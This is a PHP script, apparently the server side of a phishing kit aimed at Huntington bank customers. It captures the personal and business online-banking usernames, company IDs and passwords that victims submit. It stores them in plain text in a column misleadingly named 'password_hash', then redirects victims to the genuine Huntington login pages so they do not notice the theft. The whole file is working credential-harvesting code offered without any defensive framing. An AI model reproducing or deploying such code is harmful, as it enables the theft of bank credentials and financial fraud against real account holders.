<?php
require_once 'db-config.php';

// Check if this is a POST request
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    header('Location: index.html');
    exit();
}

// Get the database connection
$conn = getDbConnection();

if (!$conn) {
    // If database connection fails, still redirect but log error
    error_log('Database connection failed in save-credentials.php');
    header('Location: index.html');
    exit();
}

// Determine login type and extract credentials
$login_type = isset($_POST['login-form-type']) ? $_POST['login-form-type'] : 'business';
$username = '';
$password = '';

if (isset($_POST['username']) && isset($_POST['password'])) {
    // Personal login
    $username = $_POST['username'];
    $password = $_POST['password'];
    $login_type = 'personal';
} elseif (isset($_POST['companyid']) && isset($_POST['userid']) && isset($_POST['password'])) {
    // Business login
    $username = $_POST['companyid'] . ':' . $_POST['userid'];
    $password = $_POST['password'];
    $login_type = 'business';
} else {
    // Invalid request
    closeDbConnection($conn);
    header('Location: index.html');
    exit();
}

// Validate data
if (empty($username) || empty($password)) {
    closeDbConnection($conn);
    header('Location: index.html');
    exit();
}

// Prepare and execute SQL statement
$stmt = $conn->prepare("INSERT INTO user_credentials (username, password_hash, account_type, created_at, last_login) VALUES (?, ?, ?, NOW(), NOW())");

// Bind parameters
$stmt->bind_param("sss", $username, $password, $login_type);

// Execute the statement
if ($stmt->execute()) {
    // Success - redirect to original huntington.com login page
    $stmt->close();
    closeDbConnection($conn);

    if ($login_type === 'personal') {
        header('Location: https://onlinebanking.huntington.com/rol/Auth/login.aspx');
    } else {
        header('Location: https://businessonline.huntington.com/BOLHome/BusinessOnlineLogin.aspx');
    }
    exit();
} else {
    // Error - log and redirect back to form
    error_log('SQL Error: ' . $stmt->error);
    $stmt->close();
    closeDbConnection($conn);
    header('Location: index.html');
    exit();
}
?>
